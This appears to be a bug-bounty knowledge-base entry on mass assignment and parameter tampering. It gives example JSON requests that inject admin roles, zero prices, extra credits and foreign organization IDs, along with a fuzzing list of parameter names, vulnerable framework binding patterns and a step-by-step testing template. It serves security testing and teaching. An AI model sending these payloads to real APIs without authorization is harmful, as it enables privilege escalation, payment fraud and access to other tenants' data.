---
id: "mass-assignment"
title: "Mass Assignment & Parameter Tampering"
type: "technique"
category: "web-application"
subcategory: "authorization"
tags: ["mass-assignment", "parameter-tampering", "auto-binding", "privilege-escalation", "api"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["idor-bola", "business-logic-flaws", "account-takeover"]
updated: "2026-03-30"
---

## Overview

Mass assignment (auto-binding) occurs when an API accepts and processes parameters the client shouldn't control — like `role`, `isAdmin`, `balance`, `verified`. The app binds all request parameters to the internal object without filtering. Found in REST APIs, GraphQL mutations, and form submissions. Payout: $1k-$15k+.

## Attack Patterns

### Privilege Escalation
```json
// Normal registration
POST /api/register
{"username":"attacker","email":"a@b.com","password":"pass123"}

// Add hidden admin parameter
POST /api/register
{"username":"attacker","email":"a@b.com","password":"pass123","role":"admin"}
{"username":"attacker","email":"a@b.com","password":"pass123","isAdmin":true}
{"username":"attacker","email":"a@b.com","password":"pass123","permissions":["admin","superuser"]}
```

### Price/Credit Manipulation
```json
// Normal order
POST /api/order
{"product_id":1,"quantity":1}

// Add price override
POST /api/order
{"product_id":1,"quantity":1,"price":0}
{"product_id":1,"quantity":1,"discount":100}
{"product_id":1,"quantity":1,"total":0.01}
```

### Account Attribute Manipulation
```json
// Profile update
PUT /api/user/profile
{"name":"Attacker"}

// Add restricted attributes
PUT /api/user/profile
{"name":"Attacker","email_verified":true}
{"name":"Attacker","account_type":"premium"}
{"name":"Attacker","credits":99999}
{"name":"Attacker","organization_id":"victim_org"}
```

## Discovery Techniques

```
1. Read API documentation / OpenAPI spec — find all model properties
2. Check error messages — sometimes reveal valid parameter names
3. Register account, read your user object — identify all fields
4. Try adding each field to write requests (PUT/POST/PATCH)
5. Check GraphQL schema introspection for all mutation input fields
6. Look at JavaScript source for object property names
7. Fuzz with common parameter names:
   role, admin, isAdmin, is_admin, permissions, type, status,
   verified, email_verified, balance, credits, price, discount,
   organization_id, tenant_id, group, level, tier, plan
```

## Framework-Specific

```
# Ruby on Rails — params.permit() bypass
# If strong parameters are misconfigured or missing

# Django — model.objects.create(**request.data)
# Direct dict unpacking into model creation

# Node.js/Express — Object.assign(user, req.body)
# Merging request body into model object

# Spring Boot — @ModelAttribute or @RequestBody
# Auto-binding all JSON fields to Java objects

# Laravel — $model->fill($request->all())
# Mass fill without $fillable/$guarded
```

## Deep Dig Prompts

```
Given this API [describe endpoints, methods, known parameters]:
1. Map all model properties from documentation, introspection, or response objects.
2. For each write endpoint (POST/PUT/PATCH), add every discovered property.
3. Prioritize: role/admin flags, financial fields, verification status, org/tenant IDs.
4. Test both JSON and form-encoded formats.
5. Check if PATCH allows partial updates with restricted fields even if POST doesn't.
6. Test GraphQL mutations for unprotected input fields.
```

## Tools

- **Burp Suite** — Param Miner extension for discovering hidden parameters
- **Arjun** — HTTP parameter discovery
- **ffuf** — Parameter name fuzzing
